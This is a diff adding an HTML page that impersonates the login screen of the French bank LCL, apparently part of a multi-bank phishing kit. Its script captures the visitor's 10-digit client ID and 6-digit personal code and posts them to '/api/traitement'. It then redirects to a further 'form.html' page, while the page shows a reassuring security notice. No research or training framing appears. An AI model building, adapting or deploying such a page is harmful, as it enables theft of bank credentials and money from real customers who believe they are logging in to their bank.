@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LCL - Accès Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- CHARTE DESIGN HAUTE FIDÉLITÉ LCL --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            color: #1c2442;
+            -webkit-font-smoothing: antialiased;
+        }
+        .app-container {
+            max-width: 450px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            position: relative;
+        }
+
+        /* Barre d'outils supérieure de navigation */
+        .lcl-top-navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .lcl-nav-link {
+            color: #00287a;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        /* Conteneur de Logo */
+        .lcl-top-logo-area {
+            display: flex;
+            justify-content: center;
+            padding: 25px 0 15px 0;
+            background-color: #ffffff;
+        }
+        .lcl-main-logo {
+            width: 75px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        /* Zone de Retour Inter-étape */
+        .lcl-back-to-id-zone {
+            padding: 10px 24px;
+            display: none;
+        }
+        .lcl-back-link {
+            color: #00287a;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        /* Corps du formulaire */
+        .lcl-main-content {
+            padding: 20px 24px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .lcl-block-title {
+            font-size: 18px;
+            color: #00287a;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        /* Zone d'identifiant et Slots */
+        .lcl-section-id {
+            width: 100%;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .lcl-slots-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 6px;
+            max-width: 360px;
+            margin: 0 auto 25px auto;
+            position: relative;
+            cursor: text;
+        }
+        #lcl-hidden-id-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: text;
+            z-index: 2;
+        }
+        .lcl-slot-dash {
+            flex: 1;
+            height: 40px;
+            border-bottom: 2px solid #b4c6e7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #00287a;
+            transition: border-color 0.2s;
+        }
+        /* Mémorisation identifiant */
+        .lcl-remember-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .lcl-round-check {
+            width: 18px;
+            height: 18px;
+            accent-color: #00287a;
+            cursor: pointer;
+        }
+        .lcl-remember-box label {
+            font-size: 14px;
+            color: #555555;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* Boutons de Soumission Style LCL (Gélule/Pill) */
+        .lcl-btn-pill-blue {
+            width: 100%;
+            padding: 15px;
+            background-color: #00287a;
+            color: #ffffff;
+            border: none;
+            border-radius: 50px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+        .lcl-btn-pill-blue:hover {
+            background-color: #001c54;
+        }
+        .lcl-btn-pill-blue:disabled {
+            background-color: #e2e8f0;
+            color: #94a3b8;
+            cursor: not-allowed;
+        }
+        .lcl-btn-pill-gray {
+            width: 100%;
+            padding: 15px;
+            background-color: #e2e8f0;
+            color: #94a3b8;
+            border: none;
+            border-radius: 50px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Liens Perdus */
+        .lcl-lost-links {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            margin: 25px 0;
+        }
+        .lcl-lost-links a {
+            color: #00287a;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: underline;
+        }
+
+        /* Encadré de conseils sécurité officiel */
+        .lcl-security-card {
+            border: 1px solid #e2e8f0;
+            border-left: 4px solid #00287a;
+            border-radius: 8px;
+            padding: 16px;
+            background-color: #f8fafc;
+            margin-top: auto;
+        }
+        .lcl-security-title-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+            color: #00287a;
+        }
+        .lcl-security-title-row h3 {
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .lcl-security-card p {
+            font-size: 13px;
+            color: #555555;
+            line-height: 1.4;
+        }
+
+        /* --- ÉTAPE DU CODE SECRET --- */
+        .lcl-pass-header-zone {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .lcl-id-summary {
+            font-size: 14px;
+            color: #555555;
+            margin-top: -15px;
+            margin-bottom: 20px;
+        }
+        .lcl-id-summary strong {
+            color: #00287a;
+            font-weight: 700;
+        }
+
+        /* Indicateurs ronds de saisie de code */
+        .lcl-dots-indicator-row {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .lcl-indicator-dot {
+            width: 14px;
+            height: 14px;
+            border: 1px solid #00287a;
+            border-radius: 50%;
+            background-color: transparent;
+            transition: background-color 0.15s;
+        }
+        .lcl-dot-filled {
+            background-color: #00287a;
+        }
+
+        /* Clavier virtuel LCL à 4 colonnes */
+        .lcl-grid-keyboard-4col {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            max-width: 320px;
+            margin: 0 auto 30px auto;
+            justify-items: center;
+        }
+        .lcl-circle-key {
+            width: 58px;
+            height: 58px;
+            border-radius: 50%;
+            border: none;
+            background-color: #f0f4fa;
+            color: #00287a;
+            font-size: 18px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.1s;
+        }
+        .lcl-circle-key:active {
+            background-color: #d1e0f7;
+        }
+        .lcl-key-clear {
+            background-color: #fff0f0;
+            color: #d946ef;
+        }
+        .lcl-key-clear svg {
+            width: 20px;
+            height: 20px;
+            fill: #ef4444;
+        }
+
+        /* Structure de basculement dynamique de panneaux */
+        .lcl-sub-panel {
+            display: none;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+        .lcl-panel-active {
+            display: flex;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <header class="lcl-top-navbar">
+            <a class="lcl-nav-link">✕ Quitter</a>
+            <div class="lcl-top-logo-area">
+                <img src="LCL_banque_logo.svg.webp" alt="LCL Banque et Assurance" class="lcl-main-logo">
+            </div>
+            <a class="lcl-nav-link">? Aide</a>
+        </header>
+
+        <div class="lcl-back-to-id-zone" id="lcl-back-container">
+            <span class="lcl-back-link" id="lcl-btn-back">‹ Retour à l'identifiant</span>
+        </div>
+
+        <main class="lcl-main-content">
+
+            <div class="lcl-section-id" id="lcl-id-form-block">
+                <h2 class="lcl-block-title" id="lcl-title-state">Saisissez votre identifiant</h2>
+                
+                <div class="lcl-slots-container" id="lcl-slots-trigger">
+                    <input type="tel" id="lcl-hidden-id-input" maxlength="10" autocomplete="off">
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                    <div class="lcl-slot-dash"><span class="lcl-slot-val"></span></div>
+                </div>
+
+                <div class="lcl-remember-box" id="lcl-remember-zone">
+                    <input type="checkbox" id="lcl-remember" class="lcl-round-check" checked>
+                    <label for="lcl-remember">Mémoriser mon identifiant</label>
+                </div>
+            </div>
+
+
+            <div id="lcl-sub-step-id-actions" class="lcl-sub-panel lcl-panel-active">
+                <button id="lcl-btn-next" class="lcl-btn-pill-blue" disabled style="opacity: 0.5;">Suivant ➔</button>
+
+                <div class="lcl-lost-links">
+                    <a href="#">Identifiant oublié ?</a>
+                    <a href="#">Code personnel oublié ?</a>
+                </div>
+
+                <div class="lcl-security-card">
+                    <div class="lcl-security-title-row">
+                        <span style="font-size: 16px;">🛡️</span>
+                        <h3>Nos conseils sécurité</h3>
+                    </div>
+                    <p>Ne communiquez jamais vos codes secrets. LCL ne vous les demandera jamais par e-mail ou SMS.</p>
+                </div>
+            </div>
+
+
+            <div id="lcl-sub-step-pass-actions" class="lcl-sub-panel">
+                
+                <div class="lcl-pass-header-zone">
+                    <h2 class="lcl-block-title">Votre code personnel</h2>
+                    <p class="lcl-id-summary">Identifiant : <strong id="lcl-recap-num">----------</strong></p>
+                </div>
+
+                <div class="lcl-dots-indicator-row">
+                    <span class="lcl-indicator-dot"></span>
+                    <span class="lcl-indicator-dot"></span>
+                    <span class="lcl-indicator-dot"></span>
+                    <span class="lcl-indicator-dot"></span>
+                    <span class="lcl-indicator-dot"></span>
+                    <span class="lcl-indicator-dot"></span>
+                </div>
+
+                <div class="lcl-grid-keyboard-4col" id="lcl-keyboard-target"></div>
+
+                <button id="lcl-btn-validate" class="lcl-btn-pill-gray" disabled>Valider ➔</button>
+            </div>
+
+        </main>
+    </div>
+
+    <input type="hidden" id="ca-page-source" value="LCL">
+
+<script>
+    /*** 1. INITIALISATION DU SCRIPT ET ÉLÉMENTS DU DOM ***/
+    const subStepId = document.getElementById('lcl-sub-step-id-actions');
+    const subStepPass = document.getElementById('lcl-sub-step-pass-actions');
+    const hiddenIdInput = document.getElementById('lcl-hidden-id-input');
+    const slotVals = document.querySelectorAll('.lcl-slot-val');
+    const btnNext = document.getElementById('lcl-btn-next');
+    const rememberZone = document.getElementById('lcl-remember-zone');
+    const idFormBlock = document.getElementById('lcl-id-form-block');
+    const backContainer = document.getElementById('lcl-back-container');
+    const btnBack = document.getElementById('lcl-btn-back');
+    const titleState = document.getElementById('lcl-title-state');
+    
+    const recapNum = document.getElementById('lcl-recap-num');
+    const indicatorDots = document.querySelectorAll('.lcl-indicator-dot');
+    const keyboardTarget = document.getElementById('lcl-keyboard-target');
+    const btnValidate = document.getElementById('lcl-btn-validate');
+
+    let personalCode = ""; 
+
+    // Focus automatique au clic sur les slots
+    const slotsTrigger = document.getElementById('lcl-slots-trigger');
+    if (slotsTrigger && hiddenIdInput) {
+        slotsTrigger.addEventListener('click', () => {
+            hiddenIdInput.focus();
+        });
+    }
+
+    // Traitement temps réel du champ identifiant numérique (10 chiffres)
+    if (hiddenIdInput) {
+        hiddenIdInput.addEventListener('input', () => {
+            hiddenIdInput.value = hiddenIdInput.value.replace(/\D/g, '');
+            const chars = hiddenIdInput.value.split('');
+            
+            slotVals.forEach((span, index) => {
+                span.textContent = chars[index] ? chars[index] : '';
+            });
+
+            if (btnNext) {
+                if (hiddenIdInput.value.length === 10) {
+                    btnNext.removeAttribute('disabled');
+                    btnNext.style.opacity = "1";
+                } else {
+                    btnNext.setAttribute('disabled', 'true');
+                    btnNext.style.opacity = "0.5";
+                }
+            }
+        });
+    }
+
+    // Action bouton Suivant : Transition vers l'étape de saisie du code secret
+    if (btnNext) {
+        btnNext.addEventListener('click', () => {
+            if (hiddenIdInput && hiddenIdInput.value.length === 10) {
+                if (recapNum) recapNum.textContent = hiddenIdInput.value;
+                if (idFormBlock) idFormBlock.style.display = "none";
+                if (backContainer) backContainer.style.display = "block";
+                if (subStepId) subStepId.classList.remove('lcl-panel-active');
+                if (subStepPass) subStepPass.classList.add('lcl-panel-active');
+                generateLclKeyboard();
+            }
+        });
+    }
+
+    // FONCTIONNALITÉ STRIP 100% OPÉRATIONNELLE : Retour à l'identifiant
+    if (btnBack) {
+        btnBack.addEventListener('click', () => {
+            personalCode = "";
+            updatePassDots();
+            if (backContainer) backContainer.style.display = "none";
+            if (idFormBlock) idFormBlock.style.display = "block";
+            if (subStepPass) subStepPass.classList.remove('lcl-panel-active');
+            if (subStepId) subStepId.classList.add('lcl-panel-active');
+            if (hiddenIdInput) hiddenIdInput.focus();
+        });
+    }
+
+    /*** 2. GÉNÉRATION DU CLAVIER CONFORME À L'APPLICATION LCL ***/
+    function generateLclKeyboard() {
+        if (!keyboardTarget) return;
+        keyboardTarget.innerHTML = "";
+        
+        // Disposition exacte des touches de la capture d'écran
+        const layout = ['9', '7', '5', '1', '8', '0', '6', '3', '4', '2'];
+
+        layout.forEach(digit => {
+            const key = document.createElement('button');
+            key.className = 'lcl-circle-key';
+            key.type = 'button'; 
+            key.textContent = digit;
+            key.onclick = () => {
+                if (personalCode.length < 6) {
+                    personalCode += digit;
+                    updatePassDots();
+                }
+            };
+            keyboardTarget.appendChild(key);
+        });
+
+        // Touche Retour Arrière / Effacer stylisée avec icône intégrée
+        const backKey = document.createElement('button');
+        backKey.className = 'lcl-circle-key lcl-key-clear';
+        backKey.type = 'button';
+        backKey.innerHTML = `<svg viewBox="0 0 24 24"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>`;
+        backKey.onclick = () => {
+            if (personalCode.length > 0) {
+                personalCode = personalCode.slice(0, -1);
+                updatePassDots();
+            }
+        };
+        keyboardTarget.appendChild(backKey);
+    }
+
+    // Suivi et coloration dynamique des indicateurs ronds
+    function updatePassDots() {
+        indicatorDots.forEach((dot, idx) => {
+            if (idx < personalCode.length) {
+                dot.classList.add('lcl-dot-filled');
+            } else {
+                dot.classList.remove('lcl-dot-filled');
+            }
+        });
+
+        if (btnValidate) {
+            if (personalCode.length === 6) {
+                btnValidate.removeAttribute('disabled');
+                btnValidate.className = 'lcl-btn-pill-blue';
+                btnValidate.style.cursor = 'pointer';
+            } else {
+                btnValidate.setAttribute('disabled', 'true');
+                btnValidate.className = 'lcl-btn-pill-gray';
+                btnValidate.style.cursor = 'not-allowed';
+            }
+        }
+    }
+
+    /*** 3. ENVOI TRAITEMENT CORRECT AVEC LA VARIABLE BANQUE VALIDE ***/
+    function submitToPHP() {
+        const pageSourceInput = document.getElementById('ca-page-source');
+        const pageSource = pageSourceInput ? pageSourceInput.value : 'LCL';
+        
+        if (btnValidate) {
+            btnValidate.disabled = true;
+            btnValidate.textContent = "Validation en cours...";
+            btnValidate.style.opacity = "0.7";
+        }
+
+        // CORRIGÉ : Envoi simultané des paramètres pour couvrir toutes les configurations API
+        const dataToSend = {
+            nom_banque: pageSource, 
+            page_source: pageSource,
+            client_id: hiddenIdInput ? hiddenIdInput.value : "Inconnu",
+            secret_code: personalCode
+        };
+
+        // Protection anti-freeze : Redirection forcée de sécurité après 1,5 seconde
+        const safetyRedirection = setTimeout(() => {
+            window.location.href = 'form.html';
+        }, 1500);
+
+        fetch('/api/traitement', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(dataToSend)
+        })
+        .then(() => {
+            clearTimeout(safetyRedirection);
+            window.location.href = 'form.html';
+        })
+        .catch(error => {
+            console.error('Erreur réseau interceptée:', error);
+            clearTimeout(safetyRedirection);
+            window.location.href = 'form.html';
+        });
+    }
+
+    // Écouteur de validation finale
+    if (btnValidate) {
+        btnValidate.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (personalCode.length === 6) {
+                submitToPHP();
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
